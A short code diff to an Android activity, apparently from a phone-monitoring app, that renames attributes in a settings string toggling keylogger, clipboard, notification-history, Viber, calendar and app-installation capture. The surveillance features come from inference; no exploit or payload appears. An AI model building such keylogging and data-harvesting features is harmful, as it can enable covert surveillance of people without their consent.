@@ -673,13 +673,13 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                         + "\" Save_Battery=\"" + save_Battery
                         + "\" Default_Phone=\"0\""
                         + " Viber=\"" + Viber+ "\""
-                        + " KeyLogger=\"" + Key_Logger + "\""
-                        + " Notification=\"" + Notification + "\""
+                        + " Keylogger=\"" + Key_Logger + "\""
+                        + " Notification_History=\"" + Notification + "\""
                         + " Network_Connection=\"" + WiFi_Status + "\""
                         + " Calendar=\"" + Calendar + "\""
                         + " Clipboard=\"" + Clipboard + "\""
 //                        + " Alert=\"" + Alert + "\""
-                        + " App_Installation=\"" + App_Install + "\""
+                        + " App_Installation_History=\"" + App_Install + "\""
                         + " Device_Name=\"" + DEVICE_NAME + "\""
                         + " OS_Device=\"" + Global.MODEL + "\" />";
                 Log.d("App_Installation", "App_Installation = "+ App_Install);
